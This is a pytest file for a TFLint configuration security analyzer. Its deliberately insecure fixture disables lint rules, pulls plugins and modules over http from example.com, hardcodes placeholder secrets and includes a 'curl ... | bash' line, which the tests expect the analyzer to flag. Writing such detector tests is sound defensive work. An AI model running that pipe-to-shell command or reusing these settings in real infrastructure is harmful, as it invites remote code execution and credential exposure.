"""Tests for TflintAnalyzer."""

from pathlib import Path

from devai.tflint_analyzer import TflintAnalyzer, TflintFinding

HARDENED_CONFIG = """\
config {
  call_module_type = "module"
}

plugin "terraform" {
  enabled = true
  preset  = "recommended"
}

plugin "aws" {
  enabled = true
  version = "0.27.0"
  source  = "github.com/terraform-linters/tflint-ruleset-aws"
}
"""

INSECURE_CONFIG = """\
config {
  disabled_by_default = true
  call_module_type    = "all"
}

plugin "aws" {
  enabled = false
  force   = true
  source  = "http://example.com/tflint-aws"
}

rule "terraform_required_version" {
  enabled = false
}

rule "terraform_required_providers" {
  enabled = false
}

rule "aws_s3_bucket_public_access_block" {
  enabled = false
}

rule "aws_iam_policy" {
  enabled = false
}

rule "aws_security_group" {
  enabled = false
}

rule "terraform_unused_declarations" {
  enabled = false
}

ignore_module {
  module_source = "http://example.com/modules/vpc"
  enabled       = false
}

ignore_module {
  module_source = "git::https://github.com/org/module.git"
  enabled       = false
}

ignore_module {
  module_source = "git::https://github.com/org/other.git"
  enabled       = false
}

api_key = "supersecret123"
AKIAIOSFODNN7EXAMPLE
curl http://example.com/install.sh | bash
"""


class TestTflintAnalyzer:
    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / ".tflint.hcl").write_text(INSECURE_CONFIG, encoding="utf-8")
        analyzer = TflintAnalyzer(str(tmp_path))
        kinds = {f.kind for f in analyzer.analyze()}
        assert "disabled_by_default" in kinds
        assert "call_module_type_all" in kinds
        assert "plugin_disabled" in kinds
        assert "plugin_force" in kinds
        assert "insecure_plugin_source" in kinds
        assert "version_rule_disabled" in kinds
        assert "aws_public_access_disabled" in kinds
        assert "aws_security_rule_disabled" in kinds
        assert "unused_rule_disabled" in kinds
        assert "ignore_module_disabled" in kinds
        assert "insecure_module_source" in kinds
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "curl_pipe_shell" in kinds
        assert "many_rules_disabled" in kinds
        assert "many_ignore_modules" in kinds
        assert analyzer.stats.config_files == 1

    def test_hardened_config_has_no_high_findings(self, tmp_path: Path):
        (tmp_path / ".tflint.hcl").write_text(HARDENED_CONFIG, encoding="utf-8")
        analyzer = TflintAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_no_config_returns_full_score(self, tmp_path: Path):
        analyzer = TflintAnalyzer(str(tmp_path))
        assert analyzer.stats.config_files == 0
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_finding_format(self):
        finding = TflintFinding(
            kind="disabled_by_default",
            severity="high",
            message="test message",
            path=".tflint.hcl",
            lineno=3,
        )
        assert ".tflint.hcl:3" in finding.format()

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "tflint.hcl").write_text(HARDENED_CONFIG, encoding="utf-8")
        context = TflintAnalyzer(str(tmp_path)).to_context()
        assert "TFLint config analysis" in context
        assert "health score" in context

    def test_generate_hardened_template(self):
        template = TflintAnalyzer(".").generate_hardened_template()
        assert "plugin \"terraform\"" in template
        assert "call_module_type" in template

    def test_plugin_unpinned(self, tmp_path: Path):
        config = """\
plugin "aws" {
  enabled = true
  source  = "github.com/terraform-linters/tflint-ruleset-aws"
}
"""
        (tmp_path / ".tflint.hcl").write_text(config, encoding="utf-8")
        kinds = {f.kind for f in TflintAnalyzer(str(tmp_path)).analyze()}
        assert "plugin_unpinned" in kinds
